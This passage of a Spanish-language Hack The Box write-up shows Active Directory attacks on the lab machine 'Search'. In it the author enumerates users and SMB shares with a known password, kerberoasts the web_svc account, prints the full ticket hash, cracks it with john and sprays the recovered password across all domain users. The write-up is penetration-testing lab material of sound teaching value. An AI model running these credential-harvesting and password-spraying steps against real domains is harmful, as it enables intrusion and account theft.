user:[Melanie.Santiago] rid:[0x4ee]
user:[Hunter.Kirby] rid:[0x4ef]
user:[Annabelle.Wells] rid:[0x4f0]
user:[Ada.Gillespie] rid:[0x4f1]
user:[Gunnar.Callahan] rid:[0x4f2]
user:[Aarav.Fry] rid:[0x4f3]
user:[Colby.Russell] rid:[0x4f4]
user:[Eve.Galvan] rid:[0x4f5]
user:[Jeramiah.Fritz] rid:[0x4f6]
user:[Cade.Austin] rid:[0x4f7]
user:[Keely.Lyons] rid:[0x4f8]
user:[Abby.Gonzalez] rid:[0x4f9]
user:[Joy.Costa] rid:[0x4fa]
user:[Vincent.Sutton] rid:[0x4fb]
user:[Cesar.Yang] rid:[0x4fc]
user:[Camren.Luna] rid:[0x4fd]
user:[Tyshawn.Peck] rid:[0x4fe]
user:[Keith.Hester] rid:[0x4ff]
user:[Braeden.Rasmussen] rid:[0x500]
user:[Angel.Atkinson] rid:[0x501]
user:[Sierra.Frye] rid:[0x502]
user:[Maci.Graves] rid:[0x503]
user:[Judah.Frye] rid:[0x504]
user:[Tristen.Christian] rid:[0x505]
user:[Crystal.Greer] rid:[0x506]
user:[Kayley.Ferguson] rid:[0x507]
user:[Haven.Summers] rid:[0x508]
user:[Isabela.Estrada] rid:[0x509]
user:[Kaylin.Bird] rid:[0x50a]
user:[Angie.Duffy] rid:[0x50b]
user:[Claudia.Pugh] rid:[0x50c]
user:[Jordan.Gregory] rid:[0x50d]
user:[web_svc] rid:[0x510]
user:[Tristan.Davies] rid:[0x512]
</code></pre></div></div>

<ul>
  <li>Vamos añadirlos a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s2">"hope.sharp%IsolationIsKey?"</span> 10.129.229.57 <span class="nt">-c</span> <span class="s1">'enumdomusers'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[.*?\]'</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'0x'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> all.txt
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos aplicar un <code class="language-plaintext highlighter-rouge">Kerberoasting Attack</code> <a href="https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/">https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/</a>.</p>
  </li>
  <li>
    <p>Pero no tenemos existo ya que los usuarios no tienen el <code class="language-plaintext highlighter-rouge">UF_DONT_REQUIERE_PREAUTH</code> set.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers search.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> all.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User Administrator doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Santino.Benjamin doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Payton.Harmon doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Trace.Ryan doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Reginald.Morton doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Eddie.Stevens doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Cortez.Hickman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Chace.Oneill doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Abril.Suarez doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Savanah.Velazquez doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Antony.Russo doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Cameron.Melendez doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Edith.Walls doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Lane.Wu doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Arielle.Schultz doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Bobby.Wolf doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Blaine.Zavala doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Margaret.Robinson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Celia.Moreno doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaitlynn.Lee doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Kyler.Arias doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Saniyah.Roy doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Sarai.Boone doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jermaine.Franco doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Alfred.Chan doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jamar.Holt doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Sandra.Wolfe doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Rene.Larson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Yareli.Mcintyre doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Griffin.Maddox doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Prince.Hobbs doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Armando.Nash doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Sonia.Schneider doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Maeve.Mann doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Lizeth.Love doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Amare.Serrano doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Savanah.Knox doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Frederick.Cuevas doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Marshall.Skinner doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Edgar.Jacobs doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Elisha.Watts doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Belen.Compton doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Amari.Mora doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Cadence.Conner doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Katelynn.Costa doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Sage.Henson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Maren.Guzman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Natasha.Mayer doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Chanel.Bell doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Scarlett.Parks doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Eliezer.Jordan doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Dax.Santiago doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Lillie.Saunders doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jayla.Roberts doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Lorelei.Huang doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Taniya.Hardy doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Charlee.Wilkinson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Monique.Moreno doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Desmond.Bonilla doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Claudia.Sharp doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Abbigail.Turner doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Yaritza.Riddle doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Tori.Mora doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Hugo.Forbes doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Jolie.Lee doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User German.Rice doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Zain.Hopkins doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Hope.Sharp doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Kylee.Davila doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Melanie.Santiago doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Hunter.Kirby doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Annabelle.Wells doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Ada.Gillespie doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Gunnar.Callahan doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Aarav.Fry doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Colby.Russell doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Eve.Galvan doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jeramiah.Fritz doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Cade.Austin doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Keely.Lyons doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Abby.Gonzalez doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Joy.Costa doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Vincent.Sutton doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Cesar.Yang doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Camren.Luna doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Tyshawn.Peck doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Keith.Hester doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Braeden.Rasmussen doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Angel.Atkinson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Sierra.Frye doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Maci.Graves doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Judah.Frye doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Tristen.Christian doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Crystal.Greer doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Kayley.Ferguson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Haven.Summers doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Isabela.Estrada doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaylin.Bird doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Angie.Duffy doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Claudia.Pugh doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Jordan.Gregory doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User web_svc doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Tristan.Davies doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>Bueno vamos a ver recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.229.57 <span class="nt">-u</span> hope.sharp  <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">--shares</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\h</span>ope.sharp:IsolationIsKey?
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] Enumerated shares
SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
SMB         10.129.229.57   445    RESEARCH         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.229.57   445    RESEARCH         ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.229.57   445    RESEARCH         C<span class="nv">$ </span>                             Default share
SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.229.57   445    RESEARCH         helpdesk
SMB         10.129.229.57   445    RESEARCH         IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share
SMB         10.129.229.57   445    RESEARCH         RedirectedFolders<span class="nv">$ </span>READ,WRITE
SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a ver lo que hay dentro de <code class="language-plaintext highlighter-rouge">RedirectedFolders$</code>.</p>
  </li>
  <li>
    <p>No vemos nada interesante.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> hope.sharp <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">-r</span> RedirectedFolders<span class="nv">$ </span><span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="err">$</span>
	dr--r--r--                0 Sun Apr  7 15:55:18 2024	<span class="nb">.</span>
	dr--r--r--                0 Sun Apr  7 15:55:18 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<h2 id="web_scv">web_scv</h2>

<ul>
  <li>
    <p>No encontramos nada a si que vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code> para enumerar y buscar vías para escalar privilegios <a href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a>.</p>
  </li>
  <li>
    <p>Para recolectar información vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound-python</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content bloodhound-python <span class="nt">-u</span> <span class="s1">'hope.sharp'</span> <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">-c</span> All <span class="nt">-ns</span> 10.129.229.57 <span class="nt">-d</span> search.htb
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora tienes que subir los archivos <code class="language-plaintext highlighter-rouge">.json</code> al <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>
  </li>
  <li>
    <p>Estos son los usuarios que pertenecen al grupo <code class="language-plaintext highlighter-rouge">DOMAIN ADMINS</code> vemos a <code class="language-plaintext highlighter-rouge">Tristan.Davies</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/5.png" />
</p>

<ul>
  <li>Y bueno vemos que el usuario WEB_SVC es <code class="language-plaintext highlighter-rouge">kerberoastable</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/6.png" />
</p>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">GETUsersSPN.py</code> para solicitar el TGS del usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs search.htb/hope.sharp <span class="nt">-request</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
<span class="nt">---------------------------------</span>  <span class="nt">-------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">---------</span>  <span class="nt">----------</span>
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 07:59:11.329031  &lt;never&gt;



<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="nv">$krb5tgs$23$*</span>web_svc<span class="nv">$SEARCH</span>.HTB<span class="nv">$search</span>.htb/web_svc<span class="k">*</span><span class="nv">$ef435038d4624caac1c1e1fe0a242fae$ae77292d085f959d097ee988ae8ba39fbf3b7d1c3b72efc19bf7c8197ab68c88d4a4c34bca1261ca6239a5bbd9fa375ef3dd6f8aa38c808a10bf44ea06baecbfb6c5dc7d0549de684ec0fe3462726c8098094d298587ca0c2b99cfb4276502d95c324bb6f2197131536701dbd3325da0fa38952bbbdc7a062fa5d0cade5ac935e6442f7bd80e537709cc1b73553320669b4f711079735eb549a1243874520b7437ccb76e0c15b133c0887ab3842a93d8890e5da870844f5cfdbe9cdf0039ea2ad712c0503dd947afd82069d1f1bee24bdada3d372ae7f86cea9eb59cc7ebede4097ad20b177dd200f9268f4fc767b8ebfad8c932632f8d1559b913c9139a26fe10eec2c856faedb948e266fc569d3d1ebf61a294c464ccf3952880172acc414085edeb9f8a9faef28e8e4885308949c200716c8918c7850b7bbdb89f89a6d63e03d0a590672599501c0daae91901eb6c87f1ebe9d2ea01a44014ffcf4d8e48d652165b05108031e1cabbaf86699b6bcb918e3fc647766a4f34328d3900e1f562c9dea1b170d4d24e2105a54421f86b8acef8d06b33b48bbb74693587a49710c1d589d9273c5a6740ade98557cc16cca284016d7e577190941c227be7933dbd9ae835ed1faf2a5579cd65facbd985dc4af88bb41318cc285077fb813541887b1868fd963de1291e19144f698a1b4ff723bd98f3e6bf81cfa9491d1a8f089107fceac81ba512d3a4c0e0cbf292051c08296870a1df3e90bd2470c3fec06c0f24aac52f2f39446b00052bed6b414fe570a6638b8b5adf2227b9fe3aacd7e43b980b65b3bce8a515340940a147bc00722f9831d718f9f20e9e46964fe871841663c0c42af96de540f30456f7cc011b31df229dd4d21e9c5606c7d09e24f36173461a30453b717c6813bdc5eb64c8d9d94e08e54d311b71fdf66ec1595e6ec5c3dfce1c2e0459c478dabecbf8396b750c8a9d9ec217d17b9291a3aee831dc4ab1a94b003e017f29e249520f2a38e62243da55663cf3b377a29501d979354c9d0c0213b572c92ee473df614c07bb9b55ad7be3684b16aaba088e340369c510c387b6395b3f4f9d6c29360db08855b18727a42e0f5e57d06bde11d8322b4df72d289759ef67fe1c167a9113760ca205384cbdf3d4510fdcf5765131282647fbe9bb748119b3f6f909e63fe57b9fbe5a799aa3263c61fc0785337000be220dc05b71991f5ff470a9453e7412336fb11b1e9c42c7c888a04e3c57f786bdaa7905c49cea617c4e2c770918e2703c821620bff118f587d9e907ee99c36253a4181fb20b1bab49e5a5037450f6fce881f172fb54fd2ce6a5fc6f72825b7e0f3690918996b8599af819130aa4375065e00fa61b8c5a2cec01c43923ffab89909f39dea3d1e410cb4d8a05d778205fa99afaa61ffbfe0c00d54bab2486241dac57602941a26e40afc83ebb55d17453b4372b72e06161e946adecf8da</span>
</code></pre></div></div>

<ul>
  <li>En caso de que no funcione el ataque necesitas estar sincronizado al reloj de la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ ntpdate 10.129.229.57
</code></pre></div></div>

<ul>
  <li>Ahora como tenemos el hash podemos crackearlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
0g 0:00:00:29 39.26% <span class="o">(</span>ETA: 16:38:09<span class="o">)</span> 0g/s 198514p/s 198514c/s 198514C/s marsters62..marshmallow4646
@3ONEmillionbaby <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:54 DONE <span class="o">(</span>2024-04-07 16:37<span class="o">)</span> 0.01835g/s 210937p/s 210937c/s 210937C/s @421eduymayte619..@123abc@
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Vamos a validar que la contraseña es correcta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb search.htb <span class="nt">-u</span> web_svc <span class="nt">-p</span> @3ONEmillionbaby
SMB         search.htb      445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         search.htb      445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\w</span>eb_svc:@3ONEmillionbaby
</code></pre></div></div>

<h2 id="edgarjacobs">edgar.jacobs</h2>

<ul>
  <li>Como tenemos muchos usuarios podemos probar un ataque de fuerza bruta para ver si otros usuarios reutilizan la misma contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb search.htb <span class="nt">-u</span> all.txt <span class="nt">-p</span> @3ONEmillionbaby <span class="nt">--continue-on-success</span>
➜  content crackmapexec smb search.htb <span class="nt">-u</span> all.txt <span class="nt">-p</span> @3ONEmillionbaby <span class="nt">--continue-on-success</span>
SMB         search.htb      445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>dministrator:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\G</span>uest:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\k</span>rbtgt:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>antino.Benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\P</span>ayton.Harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\T</span>race.Ryan:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\R</span>eginald.Morton:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>ddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>ortez.Hickman:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>hace.Oneill:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>bril.Suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>avanah.Velazquez:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>ntony.Russo:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>ameron.Melendez:@3ONEmillionbaby STATUS_LOGON_FAILURE
